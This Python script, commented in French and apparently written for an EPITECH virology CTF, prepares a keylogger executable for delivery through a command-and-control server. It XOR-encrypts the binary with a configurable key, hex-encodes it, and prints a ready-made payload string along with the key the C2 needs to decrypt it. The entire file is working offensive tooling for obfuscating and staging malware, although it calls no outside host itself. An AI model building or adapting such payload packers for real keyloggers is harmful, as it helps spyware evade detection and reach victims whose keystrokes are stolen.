#!/usr/bin/env python3
"""
======================================================================
  Encrypter XOR + Convertisseur EXE vers Hex pour C2
  EPITECH T-VIR CTF - Keylogger Payload
======================================================================

Ce script:
1. Lit le fichier .exe du keylogger
2. Encrypte avec XOR polyalphabétique (multi-bytes key)
3. Convertit en hexadécimal
4. Sauvegarde le résultat prêt pour le C2
"""

import sys
import os

def xor_encrypt(data, key_bytes):
    """
    Encrypte les données avec XOR polyalphabétique

    Args:
        data: bytes à encrypter
        key_bytes: clé XOR (peut être multi-bytes)

    Returns:
        bytes encryptés
    """
    encrypted = bytearray()
    key_len = len(key_bytes)

    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_bytes[i % key_len])

    return bytes(encrypted)

def bytes_to_hex(data):
    """Convertit bytes en string hexadécimal"""
    return data.hex().upper()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 encrypt_and_convert.py <fichier.exe> [xor_key_hex]")
        print("\nExemples:")
        print("  python3 encrypt_and_convert.py keylogger_shmem.exe")
        print("  python3 encrypt_and_convert.py keylogger_shmem.exe 42")
        print("  python3 encrypt_and_convert.py keylogger_shmem.exe DEADBEEF")
        sys.exit(1)

    exe_file = sys.argv[1]

    # Clé XOR par défaut (doit correspondre à celle du C2)
    # Par défaut: single byte 0x42
    xor_key_hex = sys.argv[2] if len(sys.argv) > 2 else "42"

    # Convertir la clé hex en bytes
    try:
        xor_key_bytes = bytes.fromhex(xor_key_hex)
    except ValueError:
        print(f"[!] Erreur: La clé XOR '{xor_key_hex}' n'est pas un hexadécimal valide")
        sys.exit(1)

    if not os.path.exists(exe_file):
        print(f"[!] Erreur: Le fichier '{exe_file}' n'existe pas")
        sys.exit(1)

    print("=" * 70)
    print("  Encrypter XOR + Convertisseur Hex pour C2")
    print("  EPITECH T-VIR CTF - Keylogger Payload")
    print("=" * 70)
    print()

    # Lire le fichier
    print(f"[+] Lecture du fichier: {exe_file}")
    with open(exe_file, 'rb') as f:
        payload_data = f.read()

    file_size = len(payload_data)
    print(f"[+] Taille du fichier: {file_size} bytes ({file_size / 1024:.2f} KB)")
    print()

    # Encrypter avec XOR
    print(f"[+] Encryption XOR avec clé: {xor_key_hex} ({len(xor_key_bytes)} bytes)")
    encrypted_data = xor_encrypt(payload_data, xor_key_bytes)
    print(f"[+] Payload encrypté: {len(encrypted_data)} bytes")

    # Afficher les premiers bytes (avant/après encryption)
    print(f"\n[DEBUG] Premiers 16 bytes (original):")
    print(f"        {payload_data[:16].hex().upper()}")
    print(f"[DEBUG] Premiers 16 bytes (encryptés):")
    print(f"        {encrypted_data[:16].hex().upper()}")
    print()

    # Convertir en hex
    print("[+] Conversion en hexadécimal...")
    hex_string = bytes_to_hex(encrypted_data)
    hex_length = len(hex_string)

    print(f"[+] Longueur de la chaîne hex: {hex_length} caractères")
    print()

    # Sauvegarder dans un fichier
    basename = os.path.splitext(exe_file)[0]
    output_file = f"{basename}_encrypted_hex.txt"

    with open(output_file, 'w') as f:
        f.write(hex_string)

    print(f"[+] Sauvegardé dans: {output_file}")
    print()

    # Afficher un aperçu
    preview_len = min(100, hex_length)
    print(f"[+] Aperçu (premiers {preview_len} caractères):")
    print(hex_string[:preview_len] + "...")
    print()

    print("=" * 70)
    print("[+] Format pour le C2:")
    print("=" * 70)
    print(f'payload: "{hex_string[:80]}..."')
    print()
    print(f"Longueur totale: {hex_length} caractères")
    print(f"Clé XOR utilisée: {xor_key_hex}")
    print()
    print("[+] Conversion et encryption réussies!")
    print(f"[+] Pour envoyer au C2, utilisez le contenu de: {output_file}")
    print()
    print("[!] IMPORTANT: Le C2 doit utiliser la même clé XOR pour décrypter!")
    print(f"[!] Clé XOR (hex): {xor_key_hex}")
    print("=" * 70)

if __name__ == "__main__":
    main()
